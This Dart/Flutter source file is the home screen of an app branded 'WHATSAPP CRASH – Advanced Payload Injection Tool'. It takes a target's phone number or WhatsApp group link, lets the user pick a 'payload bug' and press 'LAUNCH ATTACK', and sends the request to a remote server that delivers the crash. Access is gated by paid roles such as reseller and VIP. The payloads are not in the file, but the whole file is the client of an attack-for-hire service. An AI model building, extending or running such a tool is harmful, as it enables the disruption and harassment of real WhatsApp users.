import 'dart:convert';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'widgets/custom_popup.dart';
import 'bug_sender.dart'; 

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  late AnimationController _pulseController;
  String selectedBugId = "";
  VideoPlayerController? _videoController;

  String _selectedBugMode = "number";

  String _senderMode = "private";
  int _privateSenderCount = 0;
  int _globalSenderCount = 0;

  bool _isSending = false;

  static const List<String> _globalAllowedRoles = ['reseller', 'admin', 'owner', 'vip'];

  bool get _canUseGlobalSender =>
      _globalAllowedRoles.contains(widget.role.toLowerCase());

  // ─── TEMA NEOBRUTALISM ───────────────────────────────────────
  final Color primaryBg = const Color(0xFFFFFDF5);
  final Color cardBg = const Color(0xFFFFFFFF);
  final Color sectionBg = const Color(0xFFFFFFFF);
  final Color borderColor = const Color(0xFF000000);
  final Color accentWhite = const Color(0xFFFFDE59);
  final Color textGrey = const Color(0xFF333333);

  final Color _kBlack = const Color(0xFF000000);
  final Color _kWhite = const Color(0xFFFFFFFF);
  final Color _kCyan = const Color(0xFF4D96FF);
  final Color _kPink = const Color(0xFFFF6B6B);
  final Color _kGreen = const Color(0xFF6BCB77);
  final Color _kOrange = const Color(0xFFFF9F45);
  final Color _kYellow = const Color(0xFFFFDE59);
  final Color _kGrey = const Color(0xFFBDBDBD);

  @override
  void initState() {
    super.initState();

    if (!_canUseGlobalSender) {
      _senderMode = 'private';
    }

    _videoController = VideoPlayerController.asset('assets/videos/bug.mp4')
      ..initialize().then((_) {
        setState(() {});
        _videoController?.setVolume(1.0);
        _videoController?.setLooping(true);
        _videoController?.play();
      });

    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat(reverse: true);

    if (widget.listBug.isNotEmpty) {
      final initialBugs = _getFilteredBugs();
      if (initialBugs.isNotEmpty) {
        selectedBugId = initialBugs[0]['bug_id'];
      }
    }

    _fetchSenderStats();
  }

  List<Map<String, dynamic>> _getFilteredBugs() {
    if (_selectedBugMode == "group") {
      return widget.listBug.where((b) => b['bug_id'].contains('_group')).toList();
    } else {
      return widget.listBug.where((b) => !b['bug_id'].contains('_group')).toList();
    }
  }

  Future<void> _fetchSenderStats() async {
    try {
      final res = await http.get(Uri.parse(
          "http://zyuxtra.gixsz.my.id:3898/getSenderStats?key=${widget.sessionKey}"));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['valid'] == true) {
          setState(() {
            _privateSenderCount = data['private'] ?? 0;
            _globalSenderCount = data['global'] ?? 0;
          });
        }
      }
    } catch (e) {
      debugPrint("Error fetching sender stats: $e");
    }
  }

  @override
  void dispose() {
    _videoController?.dispose();
    _pulseController.dispose();
    targetController.dispose();
    super.dispose();
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
    if (!cleaned.startsWith('+') || cleaned.length < 8) return null;
    return cleaned;
  }

  bool isValidGroupLink(String input) {
    return input.contains('chat.whatsapp.com') && input.contains('https://');
  }

  Future<void> _sendBug() async {
    final rawInput = targetController.text.trim();
    final key = widget.sessionKey;

    if (_selectedBugMode == "number") {
      final target = formatPhoneNumber(rawInput);
      if (target == null || key.isEmpty) {
        _showAlert("Invalid Number", "Gunakan nomor internasional (misal: +62, 1, 44), bukan 08xxx.");
        return;
      }
    } else {
      if (!isValidGroupLink(rawInput)) {
        _showAlert("Invalid Link", "Masukkan link group WA yang valid (contoh: https://chat.whatsapp.com/...).");
        return;
      }
    }

    final currentBugs = _getFilteredBugs();
    if (!currentBugs.any((b) => b['bug_id'] == selectedBugId)) {
      if (currentBugs.isNotEmpty) {
        setState(() {
          selectedBugId = currentBugs[0]['bug_id'];
        });
      } else {
        _showAlert("Error", "Tidak ada bug tersedia untuk mode ini.");
        return;
      }
    }

    setState(() {
      _isSending = true;
    });

    final effectiveSenderMode = _canUseGlobalSender ? _senderMode : 'private';

    try {
      final res = await http.get(Uri.parse(
          "http://zyuxtra.gixsz.my.id:3898/sendBug?key=$key&target=$rawInput&bug=$selectedBugId&senderMode=$effectiveSenderMode"));
      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) {
        _showAlert("⏳ Cooldown", "Tunggu beberapa saat sebelum mengirim lagi.");
      } else if (data["valid"] == false) {
        _showAlert("❌ Key Invalid", "Sesi Anda tidak valid. Silakan login ulang.");
      } else if (data["sended"] == false) {
        _showAlert("⚠️ Gagal", "Server sedang maintenance atau terjadi kegagalan.");
      } else {
        _showAlert("✅ Berhasil", "Bug sukses dikirim ke target!");
        targetController.clear();
        _fetchSenderStats();
      }
    } catch (_) {
      _showAlert("❌ Error", "Terjadi kesalahan pada sistem. Coba lagi nanti.");
    } finally {
      setState(() {
        _isSending = false;
      });
    }
  }

  void _showAlert(String title, String msg) {
    if (!mounted) return;
    CustomPopup.display(
      context,
      title: title,
      message: msg,
      icon: title.contains("✅") ? Icons.check_circle_outline : Icons.error_outline,
      iconColor: title.contains("✅") ? _kGreen : _kPink,
      confirmText: "Close",
    );
  }

  Widget _buildTopHeader() {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: cardBg,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _kBlack, width: 2),
        boxShadow: [
          BoxShadow(
            color: _kBlack,
            blurRadius: 0,
            offset: const Offset(4, 4),
          ),
        ],
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: _kYellow,
              shape: BoxShape.circle,
              border: Border.all(color: _kBlack, width: 2),
            ),
            child: Icon(Icons.bug_report_outlined, color: _kBlack, size: 28),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  "WHATSAPP CRASH",
                  style: TextStyle(
                    color: _kBlack,
                    fontFamily: 'Orbitron',
                    fontWeight: FontWeight.w900,
                    fontSize: 18,
                    letterSpacing: 1.5,
                  ),
                ),
                const SizedBox(height: 6),
                Text(
                  "Advanced Payload Injection Tool",
                  style: TextStyle(
                    color: textGrey,
                    fontFamily: 'ShareTechMono',
                    fontSize: 11,
                    letterSpacing: 0.5,
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildSelectionButton({required String title, required String value, required IconData icon, required VoidCallback onTap}) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
        decoration: BoxDecoration(
          color: sectionBg,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: _kBlack, width: 2),
          boxShadow: [
            BoxShadow(
              color: _kBlack,
              blurRadius: 0,
              offset: const Offset(3, 3),
            ),
          ],
        ),
        child: Row(
          children: [
            Icon(icon, color: _kBlack, size: 28),
            const SizedBox(width: 16),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(title, style: TextStyle(color: _kBlack, fontSize: 11, fontWeight: FontWeight.bold, letterSpacing: 1.2)),
                  const SizedBox(height: 4),
                  Text(value, style: TextStyle(color: _kBlack, fontSize: 16, fontWeight: FontWeight.bold, fontFamily: 'ShareTechMono')),
                ],
              ),
            ),
            Icon(Icons.keyboard_arrow_right_rounded, color: _kBlack, size: 28),
          ],
        ),
      ),
    );
  }

  Widget _buildTargetToggle() {
    return Container(
      padding: const EdgeInsets.all(6),
      decoration: BoxDecoration(
        color: _kWhite,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _kBlack, width: 2),
        boxShadow: [
          BoxShadow(
            color: _kBlack,
            blurRadius: 0,
            offset: const Offset(3, 3),
          ),
        ],
      ),
      child: Row(
        children: [
          Expanded(
            child: GestureDetector(
              onTap: () {
                setState(() {
                  _selectedBugMode = "number";
                  targetController.clear();
                  final newBugs = _getFilteredBugs();
                  if (newBugs.isNotEmpty) selectedBugId = newBugs[0]['bug_id'];
                });
              },
              child: AnimatedContainer(
                duration: const Duration(milliseconds: 200),
                padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(
                  color: _selectedBugMode == "number" ? _kYellow : _kWhite,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(
                    color: _selectedBugMode == "number" ? _kBlack : Colors.transparent,
                    width: 2,
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Icon(Icons.phone_android_rounded, color: _kBlack, size: 18),
                    const SizedBox(width: 8),
                    Text(
                      "NUMBER",
                      style: TextStyle(
                        color: _kBlack,
                        fontFamily: 'Orbitron',
                        fontWeight: FontWeight.w900,
                        fontSize: 13,
                        letterSpacing: 1.2,
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ),
          const SizedBox(width: 6),
          Expanded(
            child: GestureDetector(
              onTap: () {
                setState(() {
                  _selectedBugMode = "group";
                  targetController.clear();
                  final newBugs = _getFilteredBugs();
                  if (newBugs.isNotEmpty) selectedBugId = newBugs[0]['bug_id'];
                });
              },
              child: AnimatedContainer(
                duration: const Duration(milliseconds: 200),
                padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(
                  color: _selectedBugMode == "group" ? _kYellow : _kWhite,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(
                    color: _selectedBugMode == "group" ? _kBlack : Colors.transparent,
                    width: 2,
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Icon(Icons.group_add, color: _kBlack, size: 18),
                    const SizedBox(width: 8),
                    Text(
                      "GROUP",
                      style: TextStyle(
                        color: _kBlack,
                        fontFamily: 'Orbitron',
                        fontWeight: FontWeight.w900,
                        fontSize: 13,
                        letterSpacing: 1.2,
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildSenderModeToggle() {
    final bool unlocked = _canUseGlobalSender;
    final bool isGlobalActive = _senderMode == 'global' && unlocked;

    return Container(
      padding: const EdgeInsets.all(6),
      decoration: BoxDecoration(
        color: _kWhite,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _kBlack, width: 2),
        boxShadow: [
          BoxShadow(
            color: _kBlack,
            blurRadius: 0,
            offset: const Offset(3, 3),
          ),
        ],
      ),
      child: Row(
        children: [
          Expanded(
            child: GestureDetector(
              onTap: () {
                setState(() => _senderMode = 'private');
              },
              child: AnimatedContainer(
                duration: const Duration(milliseconds: 200),
                padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(
                  color: !isGlobalActive ? _kYellow : _kWhite,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(
                    color: !isGlobalActive ? _kBlack : Colors.transparent,
                    width: 2,
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Icon(Icons.person_outline, color: _kBlack, size: 18),
                    const SizedBox(width: 8),
                    Text(
                      "PRIVATE ($_privateSenderCount)",
                      style: TextStyle(
                        color: _kBlack,
                        fontFamily: 'Orbitron',
                        fontWeight: FontWeight.w900,
                        fontSize: 12,
                        letterSpacing: 1.0,
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ),
          const SizedBox(width: 6),
          Expanded(
            child: GestureDetector(
              onTap: () {
                if (!unlocked) {
                  _showAlert(
                    "🔒 Locked Feature",
                    "Fitur GLOBAL SENDER hanya tersedia untuk role Reseller, Admin, Owner, dan VIP. Hubungi admin untuk upgrade akun Anda.",
                  );
                  return;
                }
                setState(() => _senderMode = 'global');
              },
              child: AnimatedContainer(
                duration: const Duration(milliseconds: 200),
                padding: const EdgeInsets.symmetric(vertical: 14),
                decoration: BoxDecoration(
                  color: isGlobalActive
                      ? _kYellow
                      : (unlocked ? _kWhite : _kGrey),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(
                    color: isGlobalActive ? _kBlack : Colors.transparent,
                    width: 2,
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Icon(
                      unlocked ? Icons.public : Icons.lock,
                      color: _kBlack,
                      size: 18,
                    ),
                    const SizedBox(width: 8),
                    Text(
                      unlocked
                          ? "GLOBAL ($_globalSenderCount)"
                          : "GLOBAL",
                      style: TextStyle(
                        color: _kBlack,
                        fontFamily: 'Orbitron',
                        fontWeight: FontWeight.w900,
                        fontSize: 12,
                        letterSpacing: 1.0,
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildPopupOption({
    required IconData icon,
    required Color color,
    required String title,
    String? sub,
    required VoidCallback onTap,
  }) {
    return InkWell(
      onTap: onTap,
      borderRadius: BorderRadius.circular(16),
      child: Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          border: Border.all(color: _kBlack, width: 2),
          borderRadius: BorderRadius.circular(16),
          boxShadow: [
            BoxShadow(color: _kBlack, blurRadius: 0, offset: const Offset(2, 2)),
          ],
          color: _kWhite,
        ),
        child: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: color,
                shape: BoxShape.circle,
                border: Border.all(color: _kBlack, width: 2),
              ),
              child: Icon(icon, color: _kBlack, size: 24),
            ),
            const SizedBox(width: 16),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    title,
                    style: TextStyle(
                      color: _kBlack,
                      fontWeight: FontWeight.bold,
                      fontSize: 15,
                    ),
                  ),
                  if (sub != null)
                    Text(
                      sub,
                      style: TextStyle(
                        color: Colors.black54,
                        fontSize: 11,
                      ),
                    ),
                ],
              ),
            ),
            Icon(Icons.arrow_forward_ios, color: _kBlack, size: 14),
          ],
        ),
      ),
    );
  }

  Widget _buildInputPanel() {
    final availableBugs = _getFilteredBugs();

    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        _buildTargetToggle(),
        const SizedBox(height: 16),
        
        _buildSelectionButton(
          title: "MANAGE ACTIVE SENDERS",
          value: "MANAGE BUG SENDER",
          icon: Icons.sensors,
          onTap: () {
            Navigator.push(
              context,
              MaterialPageRoute(
                builder: (_) => BugSenderPage(
                  sessionKey: widget.sessionKey,
                  username: widget.username,
                  role: widget.role,
                ),
              ),
            );
          },
        ),
        const SizedBox(height: 16),

        Padding(
          padding: const EdgeInsets.only(left: 4, bottom: 8),
          child: Text(
            "SENDER MODE",
            style: TextStyle(
              color: _kBlack,
              fontWeight: FontWeight.bold,
              fontSize: 12,
              fontFamily: 'Orbitron',
              letterSpacing: 1.5,
            ),
          ),
        ),
        _buildSenderModeToggle(),
        const SizedBox(height: 24),
        
        Padding(
          padding: const EdgeInsets.only(left: 4, bottom: 8),
          child: Text(
            _selectedBugMode == "number" ? "TARGET NUMBER" : "WHATSAPP GROUP LINK",
            style: TextStyle(
              color: _kBlack,
              fontWeight: FontWeight.bold,
              fontSize: 12,
              fontFamily: 'Orbitron',
              letterSpacing: 1.5,
            ),
          ),
        ),
        
        TextField(
          controller: targetController,
          style: TextStyle(color: _kBlack, fontSize: 16),
          cursorColor: _kBlack,
          keyboardType: _selectedBugMode == "number" ? TextInputType.phone : TextInputType.url,
          decoration: InputDecoration(
            hintText: _selectedBugMode == "number"
                ? "e.g. +628xxxxxxxx"
                : "e.g. https://chat.whatsapp.com/...",
            hintStyle: TextStyle(color: textGrey.withOpacity(0.5)),
            filled: true,
            fillColor: sectionBg,
            border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(16),
              borderSide: BorderSide(color: _kBlack, width: 2),
            ),
            enabledBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(16),
              borderSide: BorderSide(color: _kBlack, width: 2),
            ),
            focusedBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(16),
              borderSide: BorderSide(color: _kBlack, width: 2.5),
            ),
            prefixIcon: Icon(
              _selectedBugMode == "number" ? Icons.phone_android_rounded : Icons.link,
              color: _kBlack,
            ),
            contentPadding: const EdgeInsets.symmetric(vertical: 18, horizontal: 20),
          ),
        ),

        const SizedBox(height: 24),

        if (availableBugs.isNotEmpty) ...[
          Padding(
            padding: EdgeInsets.only(left: 4, bottom: 8),
            child: Text(
              "SELECT PAYLOAD BUG",
              style: TextStyle(
                color: _kBlack,
                fontWeight: FontWeight.bold,
                fontSize: 12,
                fontFamily: 'Orbitron',
                letterSpacing: 1.5,
              ),
            ),
          ),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 4),
            decoration: BoxDecoration(
              color: sectionBg,
              borderRadius: BorderRadius.circular(16),
              border: Border.all(color: _kBlack, width: 2),
              boxShadow: [
                BoxShadow(
                  color: _kBlack,
                  blurRadius: 0,
                  offset: const Offset(3, 3),
                ),
              ],
            ),
            child: DropdownButtonHideUnderline(
              child: DropdownButton<String>(
                dropdownColor: _kWhite,
                value: selectedBugId.isNotEmpty ? selectedBugId : null,
                isExpanded: true,
                icon: Icon(Icons.keyboard_arrow_down_rounded, color: _kBlack),
                iconSize: 28,
                style: TextStyle(color: _kBlack, fontSize: 15, fontWeight: FontWeight.bold, fontFamily: 'ShareTechMono'),
                items: availableBugs.map((bug) {
                  return DropdownMenuItem<String>(
                    value: bug['bug_id'],
                    child: Row(
                      children: [
                        Icon(Icons.bug_report, color: _kBlack, size: 20),
                        const SizedBox(width: 12),
                        Expanded(child: Text(bug['bug_name'])),
                      ],
                    ),
                  );
                }).toList(),
                onChanged: (value) {
                  setState(() {
                    selectedBugId = value ?? "";
                  });
                },
              ),
            ),
          ),
        ] else ...[
           Center(
             child: Padding(
               padding: EdgeInsets.all(16.0),
               child: Text("No payload available for this mode.", style: TextStyle(color: Colors.black54)),
             )
           )
        ]
      ],
    );
  }

  Widget _buildSendButton() {
    return AnimatedBuilder(
      animation: _pulseController,
      builder: (context, child) {
        return Container(
          height: 60,
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(16),
            border: Border.all(color: _kBlack, width: 2),
            color: _kPink,
            boxShadow: [
              BoxShadow(
                color: _kBlack,
                blurRadius: 0,
                offset: const Offset(4, 4),
              ),
            ],
          ),
          child: ElevatedButton(
            onPressed: _isSending ? null : _sendBug,
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.transparent,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(16),
              ),
              elevation: 0,
              shadowColor: Colors.transparent,
            ),
            child: _isSending
                ? SizedBox(
                    height: 24,
                    width: 24,
                    child: CircularProgressIndicator(
                      color: _kBlack,
                      strokeWidth: 2,
                    ),
                  )
                : Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Icon(Icons.rocket_launch_outlined, color: _kBlack, size: 20),
                      const SizedBox(width: 12),
                      Text(
                        "LAUNCH ATTACK",
                        style: TextStyle(
                          color: _kBlack,
                          fontWeight: FontWeight.w900,
                          fontSize: 16,
                          letterSpacing: 2,
                          fontFamily: 'Orbitron',
                        ),
                      ),
                    ],
                  ),
          ),
        );
      },
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: primaryBg,
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 24),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              _buildTopHeader(),
              const SizedBox(height: 20),
              
              if (_videoController != null && _videoController!.value.isInitialized)
                Container(
                  height: 220,
                  width: double.infinity,
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(20),
                    border: Border.all(color: _kBlack, width: 3),
                    boxShadow: [
                      BoxShadow(
                        color: _kBlack,
                        blurRadius: 0,
                        offset: const Offset(5, 5),
                      ),
                    ],
                  ),
                  child: ClipRRect(
                    borderRadius: BorderRadius.circular(18),
                    child: SizedBox.expand(
                      child: FittedBox(
                        fit: BoxFit.cover,
                        child: SizedBox(
                          width: _videoController!.value.size.width,
                          height: _videoController!.value.size.height,
                          child: VideoPlayer(_videoController!),
                        ),
                      ),
                    ),
                  ),
                ),
              const SizedBox(height: 20),

              _buildInputPanel(),
              const SizedBox(height: 30),
              
              _buildSendButton(),
              const SizedBox(height: 40),
            ],
          ),
        ),
      ),
    );
  }
}